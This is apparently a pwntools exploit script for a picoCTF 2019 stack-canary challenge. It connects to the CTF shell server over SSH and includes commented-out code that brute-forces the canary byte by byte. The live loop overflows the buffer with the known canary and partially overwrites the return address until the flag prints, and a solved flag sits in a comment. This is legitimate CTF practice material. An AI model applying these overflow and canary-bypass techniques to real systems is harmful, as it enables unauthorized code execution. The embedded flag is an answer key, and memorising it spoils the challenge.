from pwn import *
import sys
import subprocess
import r2pipe
# picoCTF{cAnAr135_mU5t_b3_r4nd0m!_e4f629be}

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

# if context.bits == 64:
#   r = process(['ROPgadget', '--binary', BINARY])
#   gadgets = r.recvall().strip().split('\n')[2:-2]
#   gadgets = map(lambda x: x.split(' : '),gadgets)
#   gadgets = map(lambda x: (int(x[0],16),x[1]),gadgets)
#   r.close()

#   pop_rdi = 0
#   pop_rsi_r15 = 0
#   pop_rdx = 0

#   for addr, name in gadgets:
#     if 'pop rdi ; ret' in name:
#       pop_rdi = addr
#     if 'pop rsi ; pop r15 ; ret' in name:
#       pop_rsi_r15 = addr
#     if 'pop rdx ; ret' in name:
#       pop_rdx = addr

#   def call(f, a1, a2, a3):
#     out = ''
#     if a1 != None:
#       out += p64(pop_rdi)+p64(a1)
#     if a2 != None:
#       out += p64(pop_rsi_r15)+p64(a2)*2
#     if a3 != None:
#       if pop_rdx == 0:
#         print 'RDX GADGET NOT FOUND'
#         exit(-1)
#       else:
#         out += p64(rdx)+p64(a3)
#     return out+p64(f)

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

s = ssh(host='2019shell1.picoctf.com', user='sashackers', password="XXX")

def start():
  global sh
  if len(argv) < 2:
    stdout = process.PTY
    stdin = process.PTY

    sh = process(BINARY, stdout=stdout, stdin=stdin)

    # if DEBUG:
    #   attach_gdb()

    REMOTE = False
  else:
    
    sh = s.process('vuln', cwd='/problems/canary_4_b4f5339819cbbc0e7ca4eb9e7a1ec61d')
    REMOTE = True

# key = ''
# for i in range(4):
#   for c in range(256):
#     start()
#     c = chr(c)
#     sh.sendlineafter('> ', str(33+i))
#     sh.sendlineafter('> ', 'a'*32+key+c)
#     data = sh.recvall()
#     if 'Stack Smashing Detected' not in data:
#       key += c
#       print enhex(key)
#       break
#   else:
#     print 'error'
#     exit()
while True:
  start()
  key = unhex('703f3d5f')

  sh.sendlineafter('> ', str(32+4+12+6))
  sh.sendlineafter('> ', 'a'*32+key+'a'*(4+12)+'\xed\x07')
  # sh.interactive()
  data = sh.recvall(timeout=0.5)
  if 'pico' in data:
    print data
    exit()